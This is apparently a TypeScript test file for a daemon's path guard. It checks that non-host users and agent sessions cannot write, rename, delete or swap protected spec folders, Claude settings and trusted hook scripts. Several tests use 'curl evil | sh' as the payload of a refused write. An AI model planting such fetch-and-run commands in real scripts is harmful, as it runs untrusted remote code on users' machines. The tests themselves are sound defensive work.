// PathGuard's write rules of protocol 4 (ARCHITECTURE §7.4, §5.10):
//  - in an item worktree nobody (no person, the host included) writes the topic's folder through smurg: it is what
//    the agent was started from, and the report file there belongs to the agent;
//  - the files the trust gate records for a root (the scripts a trusted Claude Code settings file runs) are
//    host-only for writes while that content is trusted (ProjectTrust.protectedPaths, asked at every write).
import { chmod, lstat, mkdir, readFile, rename, symlink, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { MAIN_ROOT, isSmurgError, rootRefKey, type AuditEntry, type FileRef, type RootRef } from '@smurg/protocol';
import { PathDeniedError, type PathDeniedReason } from '../src/core/errors.ts';
import { fakePrincipal, fakesModule, fakesOf } from '../src/core/fakes/index.ts';
import type { Principal } from '../src/core/interfaces.ts';
import { SYSTEM_PRINCIPAL } from '../src/core/permissions.ts';
import { filesModule } from '../src/files/module.ts';
import { locksModule } from '../src/locks/module.ts';
import { findNameBelow } from '../src/workspace/fs-util.ts';
import { PathGuardImpl } from '../src/workspace/path-guard.ts';
import { createTestDaemon, type TestDaemon } from '../src/testing/index.ts';

let t: TestDaemon;
let audit: AuditEntry[];
let host: Principal;
const editor = fakePrincipal('dev:eddie', 'editor', 'Eddie');
const agentMember = fakePrincipal('dev:rita', 'agent', 'Rita');
const text = (value: string): Uint8Array => new TextEncoder().encode(value);
const main = (path: string): FileRef => ({ root: MAIN_ROOT, path });
const inRoot = (root: RootRef, path: string): FileRef => ({ root, path });

beforeEach(async () => {
  t = await createTestDaemon({
    modules: [fakesModule()],
    project: { files: { 'README.md': 'hello\n', 'scripts/guard.sh': '#!/bin/sh\nexit 0\n', 'scripts/other.sh': '#!/bin/sh\n', 'specs/login/SPEC.md': '# Login\n' } },
  });
  host = t.ctx.members.principalOf(t.hostUserId) as Principal;
  audit = [];
  t.ctx.audit.subscribe((entry) => audit.push(entry));
});

afterEach(async () => {
  await t.cleanup();
});

async function denied(promise: Promise<unknown>, reason: PathDeniedReason, principal: Principal): Promise<void> {
  const before = audit.length;
  const error = await promise.then(
    () => null,
    (e: unknown) => e,
  );
  expect(error).toBeInstanceOf(PathDeniedError);
  expect((error as PathDeniedError).reason).toBe(reason);
  const entries = audit.slice(before).filter((e) => e.action === 'path.denied');
  expect(entries).toHaveLength(1);
  expect(entries[0]).toMatchObject({ outcome: 'denied', actor: principal.actor, detail: { reason } });
}

async function itemWorktree(id: string, item?: { topicId: string; topicSlug: string; itemId: string }): Promise<RootRef> {
  const dir = join(t.root, '.smurg', 'worktrees', id);
  await mkdir(join(dir, 'specs', 'login', 'reports'), { recursive: true });
  await mkdir(join(dir, 'specs', 'other'), { recursive: true });
  await mkdir(join(dir, 'src'), { recursive: true });
  await writeFile(join(dir, 'specs', 'login', 'SPEC.md'), '# Login\n');
  await writeFile(join(dir, 'specs', 'login', 'PLAN.md'), '# Plan\n');
  await writeFile(join(dir, 'specs', 'other', 'SPEC.md'), '# Other\n');
  await writeFile(join(dir, 'src', 'app.ts'), 'export {};\n');
  await t.ctx.roots.registerWorktree({ worktreeId: id, dir, ownerUserId: t.hostUserId, sharedLinks: [], ...(item === undefined ? {} : { item }) });
  return { kind: 'worktree', worktreeId: id };
}

describe('an item worktree: the topic folder is read-only for people', () => {
  const ITEM = { topicId: 'top_login', topicSlug: 'login', itemId: 't2' };

  it('nobody writes specs/<slug>/** there through smurg, the host included; everything else is as in any worktree', async () => {
    const root = await itemWorktree('wt_item', ITEM);
    expect(t.ctx.roots.get(root)?.item).toEqual(ITEM);
    for (const principal of [editor, agentMember, host]) {
      for (const path of ['specs/login/SPEC.md', 'specs/login/PLAN.md', 'specs/login/reports/t2.md', 'specs/login/notes/new.md', 'specs/LOGIN/SPEC.md']) {
        await denied(t.ctx.paths.resolve(inRoot(root, path), { principal, forWrite: true }), 'read-only', principal);
      }
      await denied(t.ctx.paths.writeFileAtomic(inRoot(root, 'specs/login/SPEC.md'), text('changed\n'), { principal }), 'read-only', principal);
      // Reads are as before.
      const read = await t.ctx.paths.readFile(inRoot(root, 'specs/login/SPEC.md'), { principal });
      expect(new TextDecoder().decode(read.bytes)).toBe('# Login\n');
      expect((await t.ctx.paths.resolve(inRoot(root, 'specs/login/SPEC.md'), { principal })).readOnly).toBe(true);
      // Another topic's folder and the code are writable like in any worktree.
      await t.ctx.paths.writeFileAtomic(inRoot(root, 'specs/other/SPEC.md'), text(`by ${principal.userId}\n`), { principal });
      await t.ctx.paths.writeFileAtomic(inRoot(root, 'src/app.ts'), text(`// ${principal.userId}\n`), { principal });
    }
    expect(await readFile(join(t.root, '.smurg', 'worktrees', 'wt_item', 'specs', 'login', 'SPEC.md'), 'utf8')).toBe('# Login\n');
  });

  it('the daemon itself and the item\'s own agent are not people: this rule does not stop them (the tool gate decides for agents)', async () => {
    const root = await itemWorktree('wt_item2', ITEM);
    await t.ctx.paths.writeFileAtomic(inRoot(root, 'specs/login/reports/t2.md'), text('stale\n'), { principal: SYSTEM_PRINCIPAL });
    const agent = t.ctx.members.agentPrincipal('ses_item', t.hostUserId, { agentName: 'Agent t2', pathRights: 'host' });
    if (agent === null) throw new Error('agent principal');
    expect(agent.kind).toBe('agent');
    const resolved = await t.ctx.paths.resolve(inRoot(root, 'specs/login/reports/t2.md'), { principal: agent, forWrite: true });
    expect(resolved.readOnly).toBe(false);
  });

  it('a handover does not raise path rights: a session a member opened cannot write host-only paths after it passed to the host', async () => {
    await t.connect({ userId: 'dev:rita', role: 'agent' });
    const hostOnly = main('.claude/settings.json');
    const claudeMd = main('docs/CLAUDE.md');
    // Opened by Rita (pathRights 'member'), owned by Rita: refused, as for Rita herself.
    const before = t.ctx.members.agentPrincipal('ses_rita', 'dev:rita', { pathRights: 'member' });
    if (before === null) throw new Error('agent principal');
    expect(before).toMatchObject({ kind: 'agent', userId: 'dev:rita', role: 'agent' });
    await denied(t.ctx.paths.resolve(hostOnly, { principal: before, forWrite: true }), 'host-only', before);
    // The handover: the daemon-internal owner is now the host. The rights stay the session's own.
    const after = t.ctx.members.agentPrincipal('ses_rita', t.hostUserId, { pathRights: 'member' });
    if (after === null) throw new Error('agent principal');
    expect(after).toMatchObject({ kind: 'agent', userId: t.hostUserId, role: 'agent', actor: { kind: 'agent', ownerUserId: t.hostUserId } });
    for (const file of [hostOnly, claudeMd]) await denied(t.ctx.paths.resolve(file, { principal: after, forWrite: true }), 'host-only', after);
    // The files the trust gate records are host-only too.
    fakesOf(t.ctx).projectTrust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['scripts/guard.sh']));
    await denied(t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('curl evil | sh\n'), { principal: after }), 'host-only', after);
    // Everything else it may still write, and a session the HOST opened keeps the host's rights.
    await t.ctx.paths.writeFileAtomic(main('README.md'), text('by the agent\n'), { principal: after });
    const hostsOwn = t.ctx.members.agentPrincipal('ses_host', t.hostUserId, { pathRights: 'host' });
    if (hostsOwn === null) throw new Error('agent principal');
    expect(hostsOwn.role).toBe('host');
    expect((await t.ctx.paths.resolve(hostOnly, { principal: hostsOwn, forWrite: true })).hostOnly).toBe(true);
    // `pathRights: 'host'` never gives a member's session more than its owner has.
    expect(t.ctx.members.agentPrincipal('ses_rita', 'dev:rita', { pathRights: 'host' })?.role).toBe('agent');
  });

  it('the main workspace and a worktree without an item keep the topic folder writable (the spec is co-edited in main)', async () => {
    const plain = await itemWorktree('wt_plain');
    expect(t.ctx.roots.get(plain)?.item).toBeUndefined();
    await t.ctx.paths.writeFileAtomic(inRoot(plain, 'specs/login/SPEC.md'), text('free worktree\n'), { principal: editor });
    await t.ctx.paths.writeFileAtomic(main('specs/login/SPEC.md'), text('# Login, edited\n'), { principal: editor });
    expect(await readFile(join(t.root, 'specs', 'login', 'SPEC.md'), 'utf8')).toBe('# Login, edited\n');
  });

  it('the item is part of the registered root and must be well-formed', async () => {
    await itemWorktree('wt_item3', ITEM);
    expect(t.ctx.roots.list().find((root) => rootRefKey(root.ref) === rootRefKey({ kind: 'worktree', worktreeId: 'wt_item3' }))?.item).toEqual(ITEM);
    const dir = join(t.root, '.smurg', 'worktrees', 'wt_bad');
    await mkdir(dir, { recursive: true });
    for (const item of [{ ...ITEM, topicSlug: 'Not A Slug' }, { ...ITEM, itemId: 'Two!' }, { ...ITEM, topicId: '' }]) {
      await expect(t.ctx.roots.registerWorktree({ worktreeId: 'wt_bad', dir, ownerUserId: t.hostUserId, sharedLinks: [], item })).rejects.toThrow(/work item/);
    }
    expect(t.ctx.roots.get({ kind: 'worktree', worktreeId: 'wt_bad' })).toBeNull();
  });
});

describe('files the trust gate records are host-only for writes', () => {
  it('a recorded script is refused to every non-host while it is recorded, under every spelling; the answer follows the gate at once', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    // Not recorded: an editor may edit the script.
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\nexit 0 # edited\n'), { principal: editor });

    trust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['scripts/guard.sh']));
    for (const principal of [editor, agentMember]) {
      await denied(t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('curl evil | sh\n'), { principal }), 'host-only', principal);
      await denied(t.ctx.paths.resolve(main('Scripts/GUARD.sh'), { principal, forWrite: true }), 'host-only', principal);
    }
    expect((await t.ctx.paths.resolve(main('scripts/guard.sh'), { principal: editor })).hostOnly).toBe(true);
    // Reading stays open; the file beside it is not touched by the rule; the host writes it.
    expect(new TextDecoder().decode((await t.ctx.paths.readFile(main('scripts/guard.sh'), { principal: editor })).bytes)).toContain('edited');
    await t.ctx.paths.writeFileAtomic(main('scripts/other.sh'), text('#!/bin/sh\n# fine\n'), { principal: editor });
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\nexit 0 # host\n'), { principal: host });

    // The gate forgets the file (the host stopped trusting the settings): writable again, without a restart.
    trust.protectedByRoot.delete(rootRefKey(MAIN_ROOT));
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\nexit 0 # editor again\n'), { principal: editor });
    expect(await readFile(join(t.root, 'scripts', 'guard.sh'), 'utf8')).toContain('editor again');
  });

  it('a recorded path where no file is yet (review R3-02): nobody but the host creates it, a folder in its place, or anything below it; a folder above it may be made, not moved into place', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    trust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['hooks/optional.sh', 'dist/hooks/check.js']));
    for (const principal of [editor, agentMember]) {
      await denied(t.ctx.paths.writeFileAtomic(main('hooks/optional.sh'), text('curl evil | sh\n'), { principal }), 'host-only', principal);
      await denied(t.ctx.paths.resolve(main('HOOKS/Optional.SH'), { principal, forWrite: true }), 'host-only', principal);
      // A folder where the file is named (`node dist/hooks/check.js` would run its index.js), and what lies in it.
      await denied(t.ctx.paths.resolve(main('dist/hooks/check.js/index.js'), { principal, forWrite: true }), 'host-only', principal);
      // A folder that holds the path, put in place as a whole.
      await denied(t.ctx.paths.resolve(main('dist'), { principal, forWrite: true, subtree: true, finalSymlink: 'self' }), 'host-only', principal);
      await denied(t.ctx.paths.resolve(main('hooks'), { principal, forWrite: true, subtree: true, finalSymlink: 'self' }), 'host-only', principal);
    }
    // Making the folder above it, and a file beside it, is ordinary work.
    expect((await t.ctx.paths.resolve(main('hooks'), { principal: editor, forWrite: true })).hostOnly).toBe(false);
    await mkdir(join(t.root, 'hooks'));
    await t.ctx.paths.writeFileAtomic(main('hooks/readme.md'), text('notes\n'), { principal: editor });
    expect((await t.ctx.paths.resolve(main('dist/hooks'), { principal: editor, forWrite: true })).hostOnly).toBe(false);
    await t.ctx.paths.writeFileAtomic(main('hooks/optional.sh'), text('#!/bin/sh\nexit 0\n'), { principal: host });
  });

  it('what is recorded for one root does not protect another root', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    const root = await itemWorktree('wt_other');
    await mkdir(join(t.root, '.smurg', 'worktrees', 'wt_other', 'scripts'), { recursive: true });
    trust.protectedByRoot.set(rootRefKey(root), new Set(['scripts/guard.sh']));
    await denied(t.ctx.paths.writeFileAtomic(inRoot(root, 'scripts/guard.sh'), text('x\n'), { principal: editor }), 'host-only', editor);
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\n# main is not protected\n'), { principal: editor });
  });

  it('a gate that throws protects nothing more; the lexical host-only list still holds', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    trust.protectedPaths = () => {
      throw new Error('gate broken');
    };
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\n# still writable\n'), { principal: editor });
    await denied(t.ctx.paths.resolve(main('.claude/settings.json'), { principal: editor, forWrite: true }), 'host-only', editor);
  });
});

// A folder is everything below it: moving, removing or replacing a folder that holds a path the caller may not write
// is a write of that path (review R1-01, R2-01, R2-02, R3-02). `subtree` is what file.rename (both ends) and
// file.delete pass.
describe('a folder that holds a path the caller may not write is not moved, removed or replaced', () => {
  const ITEM = { topicId: 'top_login', topicSlug: 'login', itemId: 't2' };
  const whole = (principal: Principal) => ({ principal, forWrite: true, subtree: true, finalSymlink: 'self' as const });

  it('an item worktree: no person moves or removes the folder above specs/<slug>, nor puts another folder in its place', async () => {
    const root = await itemWorktree('wt_item', ITEM);
    const dir = join(t.root, '.smurg', 'worktrees', 'wt_item');
    await mkdir(join(dir, 'stage', 'login'), { recursive: true });
    for (const principal of [editor, agentMember, host]) {
      // The folder above the topic's folder, under every spelling a file system folds onto it; and the folder itself.
      for (const path of ['specs', 'Specs', 'specs/login', 'specs/LOGIN']) await denied(t.ctx.paths.resolve(inRoot(root, path), whole(principal)), 'read-only', principal);
      // Nothing of the item's is below these: they move like any folder.
      for (const path of ['stage', 'stage/login', 'specs/other', 'src']) expect((await t.ctx.paths.resolve(inRoot(root, path), whole(principal))).exists).toBe(true);
      // A plain write below the folder (what a create or an upload resolves on its way down) is not a move of it.
      expect((await t.ctx.paths.resolve(inRoot(root, 'specs'), { principal, forWrite: true })).readOnly).toBe(false);
    }
    // The destination of a rename while nothing is there: `specs` moved away by a program on the host.
    await rename(join(dir, 'specs'), join(dir, 'specs.away'));
    for (const principal of [editor, agentMember, host]) await denied(t.ctx.paths.resolve(inRoot(root, 'specs'), whole(principal)), 'read-only', principal);
    // The daemon itself is not a person (it prepares the worktree), and the main workspace has no such rule.
    expect((await t.ctx.paths.resolve(inRoot(root, 'specs'), whole(SYSTEM_PRINCIPAL))).exists).toBe(false);
    expect((await t.ctx.paths.resolve(main('specs'), whole(editor))).exists).toBe(true);
  });

  it('a folder above a recorded script is host-only to move or remove while the script is recorded; the host moves it', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    await mkdir(join(t.root, 'stage'), { recursive: true });
    expect((await t.ctx.paths.resolve(main('scripts'), whole(editor))).exists).toBe(true);
    trust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['scripts/guard.sh', 'tools/hooks/lint.sh']));
    for (const principal of [editor, agentMember]) {
      for (const path of ['scripts', 'Scripts', 'scripts/guard.sh']) await denied(t.ctx.paths.resolve(main(path), whole(principal)), 'host-only', principal);
      // Where a recorded script WOULD be (the folder is not there now): nobody else puts a folder in that place.
      for (const path of ['tools', 'tools/hooks']) await denied(t.ctx.paths.resolve(main(path), whole(principal)), 'host-only', principal);
      expect((await t.ctx.paths.resolve(main('stage'), whole(principal))).exists).toBe(true);
      // Creating a file beside the script still works: a plain write of the folder is not a move of it.
      await t.ctx.paths.writeFileAtomic(main('scripts/new.sh'), text('#!/bin/sh\n'), { principal });
    }
    expect((await t.ctx.paths.resolve(main('scripts'), whole(host))).exists).toBe(true);
    trust.protectedByRoot.delete(rootRefKey(MAIN_ROOT));
    expect((await t.ctx.paths.resolve(main('scripts'), whole(editor))).exists).toBe(true);
  });

  it('a folder that holds a host-only name (a nested .claude, a CLAUDE.md, at any depth) is host-only to move or remove', async () => {
    await mkdir(join(t.root, 'pkg', 'a', '.claude'), { recursive: true });
    await writeFile(join(t.root, 'pkg', 'a', '.claude', 'settings.json'), '{}\n');
    await mkdir(join(t.root, 'docs', 'guide'), { recursive: true });
    await writeFile(join(t.root, 'docs', 'guide', 'Claude.MD'), 'be kind\n');
    await mkdir(join(t.root, 'plain', 'deep', 'er'), { recursive: true });
    await writeFile(join(t.root, 'plain', 'deep', 'er', 'notes.md'), 'x\n');
    // A link is not followed: it moves as a link, whatever it points at.
    await symlink(join(t.root, 'pkg'), join(t.root, 'plain', 'to-pkg'));
    for (const principal of [editor, agentMember]) {
      for (const path of ['pkg', 'pkg/a', 'docs', 'docs/guide']) await denied(t.ctx.paths.resolve(main(path), whole(principal)), 'host-only', principal);
      expect((await t.ctx.paths.resolve(main('plain'), whole(principal))).exists).toBe(true);
    }
    for (const path of ['pkg', 'docs']) expect((await t.ctx.paths.resolve(main(path), whole(host))).exists).toBe(true);
    // A link NAMED like a host-only entry is one.
    await symlink(join(t.root, 'scripts'), join(t.root, 'plain', 'deep', '.vscode'));
    await denied(t.ctx.paths.resolve(main('plain'), whole(editor)), 'host-only', editor);
  });

  it('a folder that cannot be looked through (too many entries, or not listable) is refused to a non-host: the answer is no', async () => {
    await mkdir(join(t.root, 'big', 'sub'), { recursive: true });
    for (let i = 0; i < 6; i++) await writeFile(join(t.root, 'big', 'sub', `f${i}.txt`), 'x\n');
    const small = new PathGuardImpl({ roots: t.ctx.roots, audit: t.ctx.audit, subtreeScanMaxEntries: 5 });
    await denied(small.resolve(main('big'), whole(editor)), 'host-only', editor);
    expect((await small.resolve(main('big'), whole(host))).exists).toBe(true);
    expect((await small.resolve(main('scripts'), whole(editor))).exists).toBe(true);
    // The default bound takes it.
    expect((await t.ctx.paths.resolve(main('big'), whole(editor))).exists).toBe(true);
    expect(await findNameBelow(join(t.root, 'big'), () => false, 7)).toBe('none');
    expect(await findNameBelow(join(t.root, 'big'), () => false, 6)).toBe('unknown');
    expect(await findNameBelow(join(t.root, 'big'), (name) => name === 'f3.txt', 3)).toMatch(/found|unknown/);
    expect(await findNameBelow(join(t.root, 'no-such-folder'), () => false)).toBe('unknown');
    // A folder the daemon cannot list (not for root, who lists everything).
    if (process.getuid?.() !== 0) {
      await chmod(join(t.root, 'big', 'sub'), 0o000);
      try {
        await denied(t.ctx.paths.resolve(main('big'), whole(editor)), 'host-only', editor);
      } finally {
        await chmod(join(t.root, 'big', 'sub'), 0o755);
      }
    }
  });
});

describe('file.rename and file.delete of a folder, through the files module (the wire)', () => {
  const ITEM = { topicId: 'top_login', topicSlug: 'login', itemId: 't2' };
  let w: TestDaemon;

  beforeEach(async () => {
    w = await createTestDaemon({
      modules: [fakesModule({ except: ['locks', 'files', 'uploads', 'downloads', 'activity', 'presence'] }), locksModule, filesModule],
      project: { files: { 'README.md': 'hello\n', 'scripts/hooks/lint.sh': '#!/bin/sh\necho the host confirmed this\n', 'src/app.ts': 'export {};\n' } },
    });
  });

  afterEach(async () => {
    await w.cleanup();
  });

  async function refusal(promise: Promise<unknown>): Promise<{ code: string; reason: unknown } | null> {
    try {
      await promise;
      return null;
    } catch (err) {
      return isSmurgError(err) ? { code: err.code, reason: err.detail?.['reason'] } : { code: 'not-a-smurg-error', reason: String(err) };
    }
  }

  it('an Editor cannot swap the folder of an item worktree\'s spec copy, nor delete it; neither can a member with agent access or the host', async () => {
    const dir = join(w.root, '.smurg', 'worktrees', 'wt_item');
    await mkdir(join(dir, 'specs', 'login', 'reports'), { recursive: true });
    await writeFile(join(dir, 'specs', 'login', 'SPEC.md'), '# Login\n');
    await writeFile(join(dir, 'specs', 'login', 'PLAN.md'), '# Plan\n');
    await w.ctx.roots.registerWorktree({ worktreeId: 'wt_item', dir, ownerUserId: w.hostUserId, sharedLinks: [], item: ITEM });
    const root: RootRef = { kind: 'worktree', worktreeId: 'wt_item' };
    const hostClient = await w.connectHost();
    const amy = await w.connect({ userId: 'dev:amy', displayName: 'Amy', role: 'editor' });
    const mei = await w.connect({ userId: 'dev:mei', displayName: 'Mei', role: 'agent' });
    // The staging folder is hers to make (people edit code in an item's worktree).
    await amy.conn.request('file.create', { file: inRoot(root, 'stage'), kind: 'dir' });
    await amy.conn.request('file.create', { file: inRoot(root, 'stage/login'), kind: 'dir' });
    await amy.conn.request('file.write', { file: inRoot(root, 'stage/login/SPEC.md'), content: text('# Login, as Amy wants it\n') });
    for (const member of [amy, mei, hostClient]) {
      expect(await refusal(member.conn.request('file.rename', { root, from: 'specs', to: 'specs.bak' }))).toEqual({ code: 'path_denied', reason: 'read-only' });
      expect(await refusal(member.conn.request('file.rename', { root, from: 'specs/login', to: 'specs/login.bak' }))).toEqual({ code: 'path_denied', reason: 'read-only' });
      expect(await refusal(member.conn.request('file.delete', { file: inRoot(root, 'specs') }))).toEqual({ code: 'path_denied', reason: 'read-only' });
      expect(await refusal(member.conn.request('file.rename', { root, from: 'stage', to: 'specs/login/stage' }))).toEqual({ code: 'path_denied', reason: 'read-only' });
    }
    expect(await readFile(join(dir, 'specs', 'login', 'SPEC.md'), 'utf8')).toBe('# Login\n');
    // With `specs` out of the way (a program on the host moved it), nobody puts another folder in its place.
    await rename(join(dir, 'specs'), join(dir, 'specs.away'));
    for (const member of [amy, mei, hostClient]) {
      expect(await refusal(member.conn.request('file.rename', { root, from: 'stage', to: 'specs' }))).toEqual({ code: 'path_denied', reason: 'read-only' });
    }
    expect((await lstat(join(dir, 'stage', 'login', 'SPEC.md'))).isFile()).toBe(true);
    await expect(lstat(join(dir, 'specs'))).rejects.toMatchObject({ code: 'ENOENT' });
    // A folder that holds nothing of the item's moves as before.
    await amy.conn.request('file.rename', { root, from: 'stage', to: 'staged' });
    await amy.conn.request('file.delete', { file: inRoot(root, 'staged') });
  });

  it('an Editor cannot rename or delete a folder that holds a recorded script, nor move a folder onto its place; the host can', async () => {
    const hostClient = await w.connectHost();
    const amy = await w.connect({ userId: 'dev:amy', displayName: 'Amy', role: 'editor' });
    fakesOf(w.ctx).projectTrust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['scripts/hooks/lint.sh']));
    const script = join(w.root, 'scripts', 'hooks', 'lint.sh');
    await amy.conn.request('file.create', { file: main('stage'), kind: 'dir' });
    await amy.conn.request('file.write', { file: main('stage/lint.sh'), content: text('#!/bin/sh\necho written by Amy, an Editor\n') });
    for (const [from, to] of [
      ['scripts/hooks', 'scripts/hooks.bak'],
      ['scripts', 'scripts.old'],
      ['scripts/hooks', 'scripts/h2'],
    ]) {
      expect(await refusal(amy.conn.request('file.rename', { root: MAIN_ROOT, from: from as string, to: to as string }))).toEqual({ code: 'host_only', reason: 'host-only' });
    }
    expect(await refusal(amy.conn.request('file.delete', { file: main('scripts/hooks') }))).toEqual({ code: 'host_only', reason: 'host-only' });
    expect(await refusal(amy.conn.request('file.delete', { file: main('scripts') }))).toEqual({ code: 'host_only', reason: 'host-only' });
    expect(await readFile(script, 'utf8')).toContain('the host confirmed this');
    // The place of the script's folder while it is not there (the host moved it aside): not Amy's to fill.
    await hostClient.conn.request('file.rename', { root: MAIN_ROOT, from: 'scripts/hooks', to: 'scripts/hooks.host' });
    expect(await refusal(amy.conn.request('file.rename', { root: MAIN_ROOT, from: 'stage', to: 'scripts/hooks' }))).toEqual({ code: 'host_only', reason: 'host-only' });
    await hostClient.conn.request('file.rename', { root: MAIN_ROOT, from: 'scripts/hooks.host', to: 'scripts/hooks' });
    expect(await readFile(script, 'utf8')).toContain('the host confirmed this');
    // Everything else of hers still works: a new file beside the script, another folder moved and removed.
    await amy.conn.request('file.write', { file: main('scripts/hooks/other.sh'), content: text('#!/bin/sh\n') });
    await amy.conn.request('file.rename', { root: MAIN_ROOT, from: 'stage', to: 'staged' });
    await amy.conn.request('file.delete', { file: main('staged') });
    // The gate forgets the script: the folder is everyone's again.
    fakesOf(w.ctx).projectTrust.protectedByRoot.delete(rootRefKey(MAIN_ROOT));
    await amy.conn.request('file.rename', { root: MAIN_ROOT, from: 'scripts/hooks', to: 'scripts/hooks.bak' });
  });

  it('an Editor cannot move or delete a folder that holds a CLAUDE.md or a .claude folder; the host can', async () => {
    const hostClient = await w.connectHost();
    const amy = await w.connect({ userId: 'dev:amy', displayName: 'Amy', role: 'editor' });
    await mkdir(join(w.root, 'fixtures', 'case', '.claude', 'skills'), { recursive: true });
    await writeFile(join(w.root, 'fixtures', 'case', 'CLAUDE.md'), 'instructions that are test data\n');
    expect(await refusal(amy.conn.request('file.rename', { root: MAIN_ROOT, from: 'fixtures/case', to: 'src/core' }))).toEqual({ code: 'host_only', reason: 'host-only' });
    expect(await refusal(amy.conn.request('file.rename', { root: MAIN_ROOT, from: 'fixtures', to: 'lib' }))).toEqual({ code: 'host_only', reason: 'host-only' });
    expect(await refusal(amy.conn.request('file.delete', { file: main('fixtures') }))).toEqual({ code: 'host_only', reason: 'host-only' });
    expect(await readFile(join(w.root, 'fixtures', 'case', 'CLAUDE.md'), 'utf8')).toContain('test data');
    await hostClient.conn.request('file.rename', { root: MAIN_ROOT, from: 'fixtures', to: 'lib' });
    await hostClient.conn.request('file.delete', { file: main('lib') });
    await expect(lstat(join(w.root, 'lib'))).rejects.toMatchObject({ code: 'ENOENT' });
  });
});
